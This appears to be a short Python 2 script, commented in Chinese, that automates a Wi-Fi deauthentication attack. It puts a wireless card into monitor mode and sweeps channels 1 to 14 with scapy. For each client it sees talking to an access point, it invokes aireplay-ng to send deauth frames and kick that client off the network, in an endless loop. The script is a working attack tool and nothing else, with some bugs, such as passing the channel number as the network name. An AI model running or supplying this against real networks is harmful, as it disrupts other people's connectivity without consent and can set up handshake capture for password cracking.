#!/usr/bin/python
# -*- coding: UTF-8 -*-

#判断是否开启监听模式
import os
from scapy.all import *

def Init(channel,WCart='wlan1',WCartMon='wlan1mon'): 
    #初始化环境，设置网卡为monitor模式，强制设置工作的信道为 channel
    #CheckAir() 待实现
    os.popen('airmon-ng check kill').read()
    print '初始化环境……'
    ifa = os.popen('ifconfig  | grep '+WCartMon+' | cut -d " " -f 1 | cut -d ":" -f 1')
    monCart = ifa.read() #检查wlan1mon 是不是已经开启
    if monCart != WCartMon+'\n':
        print '正在开启监听模式……\n'
        f = os.popen('airmon-ng start '+WCart+' '+str(channel))
        f.read()
        f.close
    if monCart == WCartMon+'\n':
        print '已经成功监听'+WCartMon+'在'+str(channel)+'信道'
    ifa.close()
    return WCartMon


def PacketHandler(pkt):
    # 解除client与AP的关联，强制client 进行重新认证
    if (pkt.type ==2 or pkt.subtype == 5 or pkt.subtype == 4) and pkt.addr1 != 'ff:ff:ff:ff:ff:ff':
        print '将'+pkt.addr1+'从'+pkt.addr2+'踢掉\n'
        ifa = os.popen('aireplay-ng -0 2 -e '+str(channel)+' -a '+pkt.addr2+' -c '+pkt.addr1+' wlan1mon')
        ifb = ifa.read()
        ifa.close()
    else:
        pass

while True:
    #无限循环
    for channel in range(1,15):
        sniff(iface = Init(channel), prn = PacketHandler,count=9999)
